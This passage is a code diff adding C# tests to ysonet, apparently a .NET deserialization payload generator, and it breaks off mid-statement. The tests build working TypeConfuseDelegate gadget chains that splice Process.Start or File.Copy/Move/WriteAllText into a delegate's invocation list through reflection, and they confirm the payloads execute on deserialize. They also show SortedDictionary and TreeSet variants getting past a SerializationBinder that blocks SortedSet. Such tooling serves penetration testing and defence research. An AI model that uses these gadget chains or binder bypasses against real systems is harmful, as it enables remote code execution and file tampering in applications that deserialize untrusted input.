+        // SortedSet wire name and lets everything else resolve normally. That is exactly the
+        // policy variants 2 and 3 target. Returning null falls back to the default binding,
+        // so the rest of the graph is untouched.
+        private sealed class SortedSetNameBlockingBinder : System.Runtime.Serialization.SerializationBinder
+        {
+            public override Type BindToType(string assemblyName, string typeName)
+            {
+                if (typeName != null
+                    && typeName.StartsWith("System.Collections.Generic.SortedSet`1", StringComparison.Ordinal))
+                    throw new System.Runtime.Serialization.SerializationException(
+                        "blocked by the test binder: " + typeName);
+                return null;
+            }
+        }
+
+        // The behavioral proof of the evasion, which the byte-name assertions alone cannot
+        // give: through a binder that rejects only the exact SortedSet wire name, variant 1
+        // is blocked and never runs, while variants 2 and 3 deserialize and fire the command
+        // into a test-owned marker file.
+        private static void TypeConfuseDelegateVariantsEvadeSortedSetBinder()
+        {
+            // Variant 1 must be blocked, and must NOT execute.
+            string blockedMarker = MarkerPath("TCD_binder_v1_blocked");
+            SafeDelete(blockedMarker);
+            try
+            {
+                byte[] payload = TcdMarkerPayload(1, "BinaryFormatter", false, false, blockedMarker);
+                Exception caught = null;
+                try { DeserializeWithBinder(payload, new SortedSetNameBlockingBinder()); }
+                catch (Exception ex) { caught = ex; }
+
+                AssertTrue(caught != null, "the binder blocks the SortedSet root of variant 1");
+                System.Threading.Thread.Sleep(300);
+                bool ran = File.Exists(blockedMarker);
+                AssertTrue(!ran, "variant 1 does not execute when its root type is blocked");
+            }
+            finally { SafeDelete(blockedMarker); }
+
+            // Variants 2 and 3 pass the same binder and fire.
+            foreach (int variant in new[] { 2, 3 })
+            {
+                string marker = MarkerPath("TCD_binder_v" + variant);
+                SafeDelete(marker);
+                try
+                {
+                    byte[] payload = TcdMarkerPayload(variant, "BinaryFormatter", false, false, marker);
+                    // The gadget throws AFTER Process.Start (the confused return value is cast
+                    // back to int), so the marker file, not a clean return, is the proof.
+                    RunSTA(delegate { DeserializeWithBinder(payload, new SortedSetNameBlockingBinder()); });
+                    AssertTrue(WaitForFile(marker, MarkerWaitMs),
+                        "variant " + variant + " fires through a binder that rejects the SortedSet wire name");
+                }
+                finally { SafeDelete(marker); }
+            }
+        }
+
+        private static void DeserializeWithBinder(byte[] payload, System.Runtime.Serialization.SerializationBinder binder)
+        {
+            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            bf.Binder = binder;
+            using (var ms = new MemoryStream(payload))
+                bf.Deserialize(ms);
+        }
+
+        // Build a real payload whose command writes the given marker file.
+        private static byte[] TcdMarkerPayload(int variant, string formatter, bool minify, bool useSimpleType, string marker)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = MarkerCommand(marker);
+            ia.IsRawCmd = true;
+            ia.Test = false;
+            ia.Minify = minify;
+            ia.UseSimpleType = useSimpleType;
+            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
+            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "TypeConfuseDelegate",
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            AssertTrue(r.Success, "TypeConfuseDelegate variant " + variant + " -f " + formatter
+                + " generates a marker payload: " + r.ErrorMessage);
+            return (byte[])r.Raw;
+        }
+
+        // SortedDictionary and TreeSet reject a duplicate key, and the two compared strings
+        // ARE the two Process.Start arguments, so an input whose executable and argument
+        // strings are equal has no semantics-preserving representation. It must be refused
+        // with a clear message, never repaired by mutating the command. An empty argument is
+        // normal and must keep working.
+        private static void TypeConfuseDelegateVariantKeyEdgeCases()
+        {
+            foreach (int variant in new[] { 1, 2, 3 })
+            {
+                // A single raw token: file name "calc.exe", argument "". Distinct, so valid.
+                RunResult empty = GenerateTcdRaw("calc.exe", variant);
+                AssertTrue(empty.Success,
+                    "variant " + variant + " generates when the argument string is empty: " + empty.ErrorMessage);
+            }
+
+            // Equal executable and argument strings. Variant 1 still GENERATES, but the
+            // payload is a dud: SortedSet drops the duplicate, so the serialized set holds one
+            // element and SortedSet.AddIfNotPresent returns at the empty-root case on
+            // deserialize without ever calling the comparer. Assert the collapse directly on
+            // the live gadget object, so the limitation is tested rather than assumed - and so
+            // nothing can start recommending variant 1 as the workaround for this input.
+            InputArgs dup = new InputArgs();
+            dup.Cmd = "dup.exe dup.exe";
+            dup.IsRawCmd = true;
+            dup.Test = false;
+            var collapsed = (System.Collections.Generic.SortedSet<string>)
+                TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(dup);
+            AssertEqual(1, collapsed.Count,
+                "variant 1 collapses equal executable and argument strings to a single element");
+
+            RunResult v1 = GenerateTcdRaw("dup.exe dup.exe", 1);
+            AssertTrue(v1.Success, "variant 1 (SortedSet) still generates for equal strings: " + v1.ErrorMessage);
+
+            foreach (int variant in new[] { 2, 3 })
+            {
+                RunResult r = GenerateTcdRaw("dup.exe dup.exe", variant);
+                AssertTrue(!r.Success, "variant " + variant + " rejects equal executable and argument strings");
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("distinct", StringComparison.OrdinalIgnoreCase) >= 0,
+                    "variant " + variant + " explains why: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("so they differ", StringComparison.OrdinalIgnoreCase) >= 0,
+                    "variant " + variant + " tells the user the only real fix: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("does not fire", StringComparison.OrdinalIgnoreCase) >= 0,
+                    "variant " + variant + " does not present variant 1 as a working workaround: " + r.ErrorMessage);
+            }
+        }
+
+        // Formatter-expansion result, locked as a test instead of left as an assumption.
+        // TypeConfuseDelegate advertises BinaryFormatter, NetDataContractSerializer and
+        // LosFormatter, and the container swap does not widen that set: all three roots are
+        // GENERIC types (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter cannot
+        // serialize a generic type. This asserts the limitation for every container rather
+        // than silently omitting the formatter, so if a framework or serializer change ever
+        // lifts it, the test says so.
+        private static void TypeConfuseDelegateContainersCannotUseSoapFormatter()
+        {
+            foreach (int variant in new[] { 1, 2, 3 })
+            {
+                AssertTrue(!Gadget("TypeConfuseDelegate").IsSupported("SoapFormatter"),
+                    "SoapFormatter is not advertised by TypeConfuseDelegate");
+
+                var gen = new TypeConfuseDelegateGenerator();
+                gen.Options().Parse(new[] { "--variant", variant.ToString() });
+                InputArgs ia = new InputArgs();
+                ia.Cmd = "calc.exe";
+                ia.Test = false;
+
+                AssertThrows(delegate { gen.Generate("SoapFormatter", ia); },
+                    "SoapFormatter cannot serialize the generic root of variant " + variant);
+            }
+        }
+
+        // Every declared variant must generate from the variant flag ALONE. A gadget's
+        // var/variant number is its own; it must never be consumed by a hardcoded inner gadget
+        // that happens to use the same option name (GenericGenerator.GenerateInner is what
+        // keeps them apart). The FULL matrix cannot catch this because it always passes
+        // --xamlurl alongside the variant, which is exactly the option the leak needed; this
+        // test deliberately passes nothing but the variant.
+        //
+        // Scoped to gadgets whose -c is a shell command or unused, so it stays fast and does
+        // not invoke the C# compiler. The file/dll-input gadgets are covered by the FULL matrix.
+        private static void EveryVariantGeneratesFromTheVariantFlagAlone()
+        {
+            // ObjectDataProvider variant 3 is the SSRF variant: --xamlurl is its genuine input,
+            // not a leaked outer option. It is the only legitimate exception.
+            var needsOwnExtraInput = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
+            {
+                "ObjectDataProvider|3",
+            };
+
+            var failures = new List<string>();
+            int checkedCells = 0;
+
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+            {
+                if (name == "Generic") continue;
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                if (g == null) continue;
+
+                var variants = g.Variants();
+                if (variants == null || variants.Count == 0) continue;
+
+                string variantFlag = VariantFlagFor(g);
+                string formatter = g.SupportedFormatters()[0].Split(' ')[0];
+
+                foreach (GadgetVariant v in variants)
+                {
+                    CommandInputType inType = v.EffectiveInput(g.CommandInput());
+                    if (inType != CommandInputType.ShellCommand && inType != CommandInputType.Ignored)
+                        continue;
+                    if (!v.SupportsFormatter(formatter)) continue;
+                    if (needsOwnExtraInput.Contains(name + "|" + v.Number)) continue;
+
+                    InputArgs ia = new InputArgs();
+                    ia.Cmd = "calc.exe";
+                    ia.Test = false;
+                    ia.ExtraArguments = new List<string> { variantFlag, v.Number.ToString() };
+
+                    RunResult r;
+                    try
+                    {
+                        r = PayloadRunner.GenerateGadget(new GenerationRequest
+                        {
+                            GadgetName = name,
+                            FormatterName = formatter,
+                            OutputFormat = "",
+                            InputArgs = ia,
+                        });
+                    }
+                    catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }
+
+                    checkedCells++;
+                    if (!r.Success)
+                        failures.Add(name + " " + variantFlag + " " + v.Number + " -f " + formatter
+                            + " -> " + r.ErrorMessage);
+                    else if (RawIsEmpty(r.Raw))
+                        failures.Add(name + " " + variantFlag + " " + v.Number + " -> empty payload");
+                }
+            }
+
+            AssertTrue(checkedCells > 0, "the variant sweep actually checked something");
+            AssertTrue(failures.Count == 0,
+                "every variant generates from the variant flag alone (" + checkedCells + " checked): "
+                    + string.Join(" | ", failures.ToArray()));
+        }
+
+        // The interactive editor must offer all three container labels, start on the
+        // SortedSet default, and emit the NUMBER on the command line, not the label.
+        private static void EditorExposesTypeConfuseDelegateContainerVariants()
+        {
+            var ed = new ModuleEditor(null, null, true, null, null);
+            var fields = ed.BuildFieldsForTest("TypeConfuseDelegate");
+
+            EditableField variant = FindEditable(fields, "variant");
+            AssertTrue(variant != null, "the variant field is offered for TypeConfuseDelegate");
+            AssertTrue(variant.Choices != null && variant.Choices.Count == 3,
+                "all three container labels are offered");
+
+            var declared = Gadget("TypeConfuseDelegate").Variants();
+            for (int i = 0; i < declared.Count; i++)
+                AssertEqual(declared[i].Label, variant.Choices[i], "label " + (i + 1) + " is in variant order");
+            AssertEqual(declared[0].Label, variant.Value, "the editor starts on variant 1 (the SortedSet default)");
+
+            FindEditable(fields, "command").Value = "calc.exe";
+            string flag = VariantFlagFor(Gadget("TypeConfuseDelegate"));
+
+            variant.Value = declared[2].Label; // TreeSet
+            string line = ed.GadgetCommandLineForTest();
+            AssertTrue(line.Contains(flag + " 3"),
+                "the echoed command line carries the numeric variant: " + line);
+            AssertTrue(!line.Contains(declared[2].Label),
+                "the human label never leaks into the command line: " + line);
+
+            variant.Value = declared[1].Label; // SortedDictionary
+            AssertTrue(ed.GadgetCommandLineForTest().Contains(flag + " 2"),
+                "switching the label switches the emitted number: " + ed.GadgetCommandLineForTest());
+        }
+
+        // The var/variant flag on the command line belongs to the OUTER gadget. Now that
+        // TypeConfuseDelegate has its own var/variant for the root container, and inner-gadget
+        // callers hand their InputArgs straight down, an unisolated outer --variant would leak:
+        // 4 fails the whole generation (the outer gadget has more variants than TCD) and 2 or 3
+        // silently swaps the inner container. GenericGenerator.GenerateInner isolates the
+        // option list, and every wrapper with a hardcoded inner gadget uses it.
+        private static void OuterVariantDoesNotReachTheInnerTypeConfuseDelegate()
+        {
+            // These outer gadgets declare 4 variants and wrap a TypeConfuseDelegate inner.
+            foreach (string gadget in new[] { "GetterSecurityException", "GetterSettingsPropertyValue" })
+            {
+                RunResult r = GenerateWithVariant(gadget, "Json.NET", 4);
+                AssertTrue(r.Success,
+                    gadget + " variant 4 still builds its TypeConfuseDelegate inner: " + r.ErrorMessage);
+            }
+
+            // An outer variant inside TypeConfuseDelegate's own 1-3 range must not change the
+            // inner payload either, so the isolated build matches a run with no --variant.
+            byte[] clean = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", CalcInput());
+            AssertTrue(clean != null && clean.Length > 0, "the default inner payload is non-empty");
+            foreach (int outer in new[] { 1, 2, 3, 4 })
+            {
+                InputArgs ia = CalcInput();
+                ia.ExtraArguments = new List<string> { "--variant", outer.ToString() };
+                byte[] withOuter = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", ia);
+                AssertTrue(BytesEqual(clean, withOuter),
+                    "an outer --variant " + outer + " does not change the default inner TypeConfuseDelegate payload");
+            }
+        }
+
+        // The command path RELIES on the sorted container's ordering rule instead of
+        // enforcing it: Process.Start only receives the executable in parameter 1 while the
+        // executable sorts above the argument string. The default "cmd /c <command>"
+        // wrapping is safe by construction ("/" sorts below "c"), but --rawcmd removes that
+        // wrapper and a command like "notepad.exe zzz.txt" comes out swapped.
+        //
+        // Until that input is refused outright, the generator NOTES it - and only in debug
+        // mode. That gate is the tested behavior, not an implementation detail: ysonet is
+        // embedded as a payload generator by other tools, and a wrapper that merges stderr
+        // into what it captures would carry the text into a base64 payload field.
+        private static void TypeConfuseDelegateNotesSwappedArgumentsInDebugOnly()
+        {
+            const string swapped = "notepad.exe zzz.txt";   // executable sorts BELOW its argument
+            const string ordered = "zzz.exe aaa.txt";       // and this pair is the right way round
+
+            // Assert the fixtures really are what the test claims, so it cannot pass by
+            // accident if the ordering ever stops diverging.
+            AssertTrue(String.Compare("notepad.exe", "zzz.txt") < 0,
+                "the swapped fixture really does sort the wrong way round");
+            AssertTrue(String.Compare("zzz.exe", "aaa.txt") > 0,
+                "the ordered fixture really does sort the right way round");
+
+            string outDebug, errDebug, outQuiet, errQuiet;
+            byte[] debugBytes = GenerateTcdCapturing(swapped, true, true, out outDebug, out errDebug);
+            byte[] quietBytes = GenerateTcdCapturing(swapped, true, false, out outQuiet, out errQuiet);
+
+            AssertTrue(errDebug.Contains("[TypeConfuseDelegate]"),
+                "debug mode notes the problem on stderr: " + errDebug);
+            AssertTrue(errDebug.Contains("swapped"),
+                "the note says what actually happens to the two strings: " + errDebug);
+            AssertTrue(errDebug.Contains("--rawcmd"),
+                "the note says how to avoid it: " + errDebug);
+
+            // The reason the note is gated. An embedding tool that merges the streams and
+            // base64-encodes what it captured must never receive this text.
+            AssertEqual("", errQuiet, "a normal run writes nothing to stderr");
+            AssertEqual("", outDebug, "the note never reaches stdout, which carries the payload");
+            AssertEqual("", outQuiet, "a normal run writes nothing to stdout either");
+
+            // The note is an observation, not a change: identical payload either way.
+            AssertTrue(BytesEqual(debugBytes, quietBytes),
+                "noting the problem does not change a single byte of the payload");
+
+            // No false positives, in debug mode where a note would be visible:
+            string o, e;
+            GenerateTcdCapturing(ordered, true, true, out o, out e);
+            AssertEqual("", e, "a correctly ordered raw command produces no note");
+
+            GenerateTcdCapturing("calc.exe", true, true, out o, out e);
+            AssertEqual("", e, "a raw command with no arguments produces no note (\"\" sorts lowest)");
+
+            // ...including the DEFAULT path, whose "cmd /c" wrapper is exactly why this has
+            // gone unnoticed: the pair is always "cmd" and "/c ...".
+            GenerateTcdCapturing("notepad.exe zzz.txt", false, true, out o, out e);
+            AssertEqual("", e, "the default cmd /c wrapping always sorts correctly, so no note");
+        }
+
+        // Generate a TypeConfuseDelegate BinaryFormatter payload, capturing everything
+        // generation wrote to stdout and stderr.
+        private static byte[] GenerateTcdCapturing(string cmd, bool rawCmd, bool debugMode,
+            out string stdout, out string stderr)
+        {
+            var so = new StringWriter();
+            var se = new StringWriter();
+            TextWriter prevOut = Console.Out, prevErr = Console.Error;
+            RunResult r;
+            Console.SetOut(so);
+            Console.SetError(se);
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = cmd;
+                ia.IsRawCmd = rawCmd;
+                ia.Test = false;
+                ia.IsDebugMode = debugMode;
+                r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = "TypeConfuseDelegate",
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+            }
+            finally { Console.SetOut(prevOut); Console.SetError(prevErr); }
+
+            stdout = so.ToString();
+            stderr = se.ToString();
+            AssertTrue(r.Success, "TypeConfuseDelegate generates for \"" + cmd + "\": " + r.ErrorMessage);
+            return Bytes(r.Raw);
+        }
+
+        // Generate with a RAW command (no "cmd /c" wrapper), so the test controls exactly how
+        // the command splits into the executable and argument strings.
+        private static RunResult GenerateTcdRaw(string rawCmd, int variant)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = rawCmd;
+            ia.IsRawCmd = true;
+            ia.Test = false;
+            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "TypeConfuseDelegate",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // The three command-path builders moved behind one shared builder
+        // (TypeConfuseDelegateGenerator.BuildConfusedContainer), which the XAML path now uses
+        // too. A refactor of a SHIPPED payload must not change a byte, so each container is
+        // rebuilt here the way its own builder used to and compared on the wire. This is a
+        // permanent lock, not a one-off check: any future change to the shared builder that
+        // alters the serialized graph fails here.
+        private static void TypeConfuseDelegateSharedBuilderKeepsTheOriginalGraphs()
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe /x";
+            ia.IsRawCmd = true;
+            ia.Test = false;
+
+            string key1 = ia.CmdFileName;
+            string key2 = ia.HasArguments ? ia.CmdArguments : "";
+            AssertTrue(!string.IsNullOrEmpty(key1) && key1 != key2,
+                "the fixture command splits into two distinct strings (got \"" + key1 + "\" and \"" + key2 + "\")");
+
+            // Variant 1 through its public builder.
+            AssertTrue(BytesEqual(BfBytes(ReferenceCommandGraph(1, key1, key2)),
+                                  BfBytes(TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(ia))),
+                "the SortedSet command payload still serializes the original graph");
+
+            // Variants 2 and 3 through the CLI path, because their builders are private. The
+            // non-minified BinaryFormatter route is a plain BinaryFormatter.Serialize (see
+            // GenericGenerator.Serialize), so the generated payload must equal the reference
+            // graph byte for byte.
+            foreach (int container in new[] { 2, 3 })
+            {
+                RunResult r = GenerateTcdRaw("calc.exe /x", container);
+                AssertTrue(r.Success, "variant " + container + " generates: " + r.ErrorMessage);
+                AssertTrue(BytesEqual(BfBytes(ReferenceCommandGraph(container, key1, key2)), Bytes(r.Raw)),
+                    "variant " + container + " still serializes the original graph");
+            }
+
+            // The XAML path shares the same builder, and the builder now takes the benign
+            // comparison as a parameter. The file-operation gadget passes
+            // String.CompareOrdinal; passing it here instead would silently change every
+            // ActivitySurrogateDisableTypeCheck / XamlAssemblyLoadFromFile payload on the
+            // wire. Nothing else would notice - the containers would still fire - so assert
+            // the serialized method name directly for all three roots.
+            //
+            // (The reference-graph comparison above cannot be used for this path: building
+            // a XamlReader.Parse delegate would make the test project reference
+            // PresentationFramework, which it deliberately does not.)
+            const string xaml = "<ResourceDictionary xmlns=\"x\" />";
+            foreach (int container in new[] { 1, 2, 3 })
+            {
+                string text = Encoding.ASCII.GetString(
+                    BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml, container)));
+                AssertTrue(text.Contains("Compare") && !text.Contains("CompareOrdinal"),
+                    "the XAML wrapper still serializes the original culture-sensitive "
+                    + "String.Compare (container " + container + ")");
+                AssertTrue(text.Contains("XamlReader"),
+                    "the XAML wrapper still splices XamlReader.Parse (container " + container + ")");
+            }
+        }
+
+        // The command-path graph as the three separate builders used to build it: comparer,
+        // fill the root with the two strings while the comparison is still benign, then splice
+        // Process.Start into invocation-list slot 1.
+        private static object ReferenceCommandGraph(int container, string key1, string key2)
+        {
+            return ReferenceGraph(container, new Comparison<string>(String.Compare),
+                new Func<string, string, System.Diagnostics.Process>(System.Diagnostics.Process.Start),
+                key1, key2);
+        }
+
+        // The same reference build for any benign comparison and any spliced delegate, so a
+        // test can reproduce the XAML path and the file-operation path too.
+        private static object ReferenceGraph(int container, Comparison<string> benign,
+            Delegate slot1, string key1, string key2)
+        {
+            Delegate da = benign;
+            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
+            IComparer<string> comp = Comparer<string>.Create(d);
+
+            object root;
+            if (container == 2)
+            {
+                var dictionary = new SortedDictionary<string, string>(comp);
+                dictionary.Add(key1, "");
+                dictionary.Add(key2, "");
+                root = dictionary;
+            }
+            else if (container == 3)
+            {
+                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
+                    "System.Collections.Generic.TreeSet`1", false);
+                AssertTrue(openTreeSet != null, "the internal TreeSet type is available");
+                root = Activator.CreateInstance(openTreeSet.MakeGenericType(typeof(string)),
+                    new object[] { comp });
+                var items = (ICollection<string>)root;
+                items.Add(key1);
+                items.Add(key2);
+            }
+            else
+            {
+                var set = new SortedSet<string>(comp);
+                set.Add(key1);
+                set.Add(key2);
+                root = set;
+            }
+
+            System.Reflection.FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
+                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
+            object[] invoke_list = d.GetInvocationList();
+            invoke_list[1] = slot1;
+            fi.SetValue(d, invoke_list);
+            return root;
+        }
+
+        private static byte[] BfBytes(object graph)
+        {
+            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            using (var ms = new MemoryStream())
+            {
+                bf.Serialize(ms, graph);
+                return ms.ToArray();
+            }
+        }
+
+        // ---- TypeConfuseDelegateFileOperations ---------------------------------
+        //
+        // The same delegate confusion with a two-string BCL file method in invocation-list
+        // slot 1 instead of Process.Start, so a deserialize writes, copies, moves or
+        // truncates on the target without starting a process. Five operations (--variant)
+        // crossed with the three serialized roots (--rootcontainer).
+
+        private const string FileOpsGadget = "TypeConfuseDelegateFileOperations";
+
+        private static readonly string[] FileOpsFormatters =
+            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
+
+        // The deserializer tag PayloadsFireIntoTestSinks uses for each of them.
+        private static string FileOpsDeserTag(string formatter)
+        {
+            switch (formatter)
+            {
+                case "BinaryFormatter": return "bf";
+                case "LosFormatter": return "los";
+                case "NetDataContractSerializer": return "ndc";
+                default: throw new Exception("no deserializer tag for " + formatter);
+            }
+        }
+
+        private static RunResult GenerateFileOps(int variant, string cmd, string formatter,
+            int? rootContainer, bool minify)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = cmd;
+            ia.Test = false;
+            ia.Minify = minify;
+            var extra = new List<string> { "--variant", variant.ToString() };
+            if (rootContainer.HasValue)
+            {
+                extra.Add("--" + TypeConfuseDelegateGenerator.RootContainerOptionName);
+                extra.Add(rootContainer.Value.ToString());
+            }
+            ia.ExtraArguments = extra;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = FileOpsGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        private static RunResult GenerateFileOps(int variant, string cmd)
+        {
+            return GenerateFileOps(variant, cmd, "BinaryFormatter", null, false);
+        }
+
+        // The BinaryFormatter bytes read as ASCII, so the embedded type-name and
+        // method-name records can be searched.
+        private static string FileOpsStreamText(int variant, string cmd, int? rootContainer)
+        {
+            RunResult r = GenerateFileOps(variant, cmd, "BinaryFormatter", rootContainer, false);
+            AssertTrue(r.Success, FileOpsGadget + " variant " + variant + " generates: " + r.ErrorMessage);
+            return Encoding.ASCII.GetString(Bytes(r.Raw));
+        }
+
+        // A path inside the test artifact directory. The 'zz' / 'aa' prefixes are how the
+        // fixtures satisfy the gadget's ordinal-ordering rule without the generator ever
+        // rewriting what the test asked for.
+        private static string FileOpsPath(string name)
+        {
+            return TestArtifactPath("ysonet_fileops_" + name);
+        }
+
+        // Content whose FIRST character sorts below any Windows path start ('!' is 0x21,
+        // below every drive letter and below '\'), so every target path in these tests
+        // sorts after the embedded text ordinally.
+        private const string FileOpsLowSortingText = "!ysonet file-operations fixture\r\n";
+
+        // The graph must serialize String.CompareOrdinal, not the culture-sensitive
+        // String.Compare the command path uses, because the order the two strings are
+        // written in is what fixes the sink's argument order. It must also carry the real
+        // two-string BCL method for the chosen operation, so a variant cannot silently
+        // fall back to another one.
+        private static void FileOperationsSerializeAnOrdinalComparerAndTheRealSink()
+        {
+            string target = FileOpsPath("zz_names.txt");
+            string content = MakeTempFile("ysonet_fileops_names_content.txt", FileOpsLowSortingText);
+            try
+            {
+                var sinks = new Dictionary<int, string>
+                {
+                    { 1, "WriteAllText" }, { 2, "Copy" }, { 3, "Move" },
+                    { 4, "Move" }, { 5, "WriteAllText" },
+                };
+                var declaringTypes = new Dictionary<int, string>
+                {
+                    { 1, "System.IO.File" }, { 2, "System.IO.File" }, { 3, "System.IO.File" },
+                    { 4, "System.IO.Directory" }, { 5, "System.IO.File" },
+                };
+
+                foreach (int variant in new[] { 1, 2, 3, 4, 5 })
+                {
+                    string cmd = FileOpsSampleCommand(variant, target, content);
+                    string text = FileOpsStreamText(variant, cmd, null);
+
+                    AssertTrue(text.Contains("CompareOrdinal"),
+                        "variant " + variant + " serializes the ordinal benign comparison");
+                    AssertTrue(text.Contains("System.Action`2"),
+                        "variant " + variant + " carries the two-string Action delegate type");
+                    AssertTrue(text.Contains(declaringTypes[variant]),
+                        "variant " + variant + " targets " + declaringTypes[variant]);
+                    AssertTrue(text.Contains(sinks[variant]),
+                        "variant " + variant + " targets " + sinks[variant]);
+                    AssertTrue(text.Contains("System.DelegateSerializationHolder"),
+                        "variant " + variant + " still carries the delegate serialization holder");
+                    AssertTrue(!text.Contains("System.Diagnostics.Process"),
+                        "variant " + variant + " starts no process");
+                }
+
+                // The command gadget is unchanged: it still ships the culture-sensitive
+                // comparison, so this refactor cannot have altered its payloads.
+                string tcd = TcdStreamText(1);
+                AssertTrue(tcd.Contains("Compare") && !tcd.Contains("CompareOrdinal"),
+                    "TypeConfuseDelegate still serializes the original String.Compare");
+            }
+            finally { SafeDelete(content); }
+        }
+
+        // A valid -c for each operation, given a target path and a local content file.
+        private static string FileOpsSampleCommand(int variant, string target, string contentFile)
+        {
+            if (variant == 1)
+                return target + ";" + contentFile;
+            if (variant == 5)
+                return target;
+            return FileOpsPath("zz_source.txt") + ";" + FileOpsPath("aa_destination.txt");
+        }
+
+        // The whole reason the builder takes a benign comparison: the container is sorted
+        // HERE, at generation time, so the payload's argument order is decided by whatever
+        // comparison fills it. With the culture-sensitive String.Compare the command path
+        // uses, "aa..." sorts BELOW "BB..." and the two arguments would come out reversed;
+        // ordinally "aa..." sorts above it. This proves both halves: the bytes do not move
+        // when the operator's culture changes, and the operation really receives its source
+        // first even in the case where the two comparisons disagree.
+        private static void FileOperationsOrderingIsOrdinalNotCultural()
+        {
+            string source = FileOpsPath("aa_culture_source.txt");
+            string dest = FileOpsPath("BB_culture_dest.txt");
+
+            AssertTrue(String.CompareOrdinal(source, dest) > 0,
+                "the fixture pair sorts source-first ordinally");
+            AssertTrue(String.Compare(source, dest, StringComparison.CurrentCulture) < 0,
+                "the same pair sorts the OTHER way under the current culture, which is what "
+                + "makes this a real test");
+
+            // Culture independence: identical bytes under two unrelated cultures.
+            byte[] underEnglish = FileOpsBytesUnderCulture("en-US", 2, source + ";" + dest);
+            byte[] underTurkish = FileOpsBytesUnderCulture("tr-TR", 2, source + ";" + dest);
+            byte[] underSwedish = FileOpsBytesUnderCulture("sv-SE", 2, source + ";" + dest);
+            AssertTrue(BytesEqual(underEnglish, underTurkish) && BytesEqual(underEnglish, underSwedish),
+                "the payload is byte-identical whatever culture it is generated under");
+
+            // Direction: the copy must go source -> destination. If the arguments came out
+            // reversed, File.Copy would be asked to read a file that does not exist and the
+            // destination would never appear.
+            SafeDelete(source);
+            SafeDelete(dest);
+            try
+            {
+                File.WriteAllText(source, "ordinal ordering keeps the source first");
+                RunSTA(delegate { DeserializeAs("bf", underEnglish); });
+
+                AssertTrue(File.Exists(dest),
+                    "the copy ran with the source as its FIRST argument (destination created)");
+                AssertEqual("ordinal ordering keeps the source first", File.ReadAllText(dest),
+                    "the destination holds the source content");
+                AssertTrue(File.Exists(source), "File.Copy leaves the source in place");
+            }
+            finally { SafeDelete(source); SafeDelete(dest); }
+        }
+
+        private static byte[] FileOpsBytesUnderCulture(string culture, int variant, string cmd)
+        {
+            var previous = System.Threading.Thread.CurrentThread.CurrentCulture;
+            try
+            {
+                System.Threading.Thread.CurrentThread.CurrentCulture =
+                    new System.Globalization.CultureInfo(culture);
+                RunResult r = GenerateFileOps(variant, cmd);
+                AssertTrue(r.Success, "generates under " + culture + ": " + r.ErrorMessage);
+                return Bytes(r.Raw);
+            }
+            finally { System.Threading.Thread.CurrentThread.CurrentCulture = previous; }
+        }
+
+        // An input the primitive cannot represent must be refused before serialization,
+        // with a message that names the operation and both fields. Never repaired by
+        // swapping or rewriting what the user typed.
+        private static void FileOperationsRefuseAnImpossibleOrder()
+        {
+            var reversed = new Dictionary<int, string>
+            {
+                { 2, FileOpsPath("aa_src.txt") + ";" + FileOpsPath("zz_dst.txt") },
+                { 3, FileOpsPath("aa_src.txt") + ";" + FileOpsPath("zz_dst.txt") },
+                { 4, FileOpsPath("aa_src") + ";" + FileOpsPath("zz_dst") },
+            };
+            var names = new Dictionary<int, string> { { 2, "copy" }, { 3, "move" }, { 4, "dirmove" } };
+
+            foreach (KeyValuePair<int, string> kv in reversed)
+            {
+                RunResult r = GenerateFileOps(kv.Key, kv.Value);
+                AssertTrue(!r.Success, "variant " + kv.Key + " refuses a reversed pair");
+                AssertTrue((r.ErrorMessage ?? "").Contains(names[kv.Key]),
+                    "the refusal names the operation: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").Contains("String.CompareOrdinal"),
+                    "the refusal names the comparison that decides: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").Contains("source path")
+                    && (r.ErrorMessage ?? "").Contains("destination path"),
+                    "the refusal names both semantic fields: " + r.ErrorMessage);
+
+                string same = FileOpsPath("same.txt");
+                RunResult equal = GenerateFileOps(kv.Key, same + ";" + same);
+                AssertTrue(!equal.Success, "variant " + kv.Key + " refuses an equal pair");
+                AssertTrue((equal.ErrorMessage ?? "").Contains("String.CompareOrdinal"),
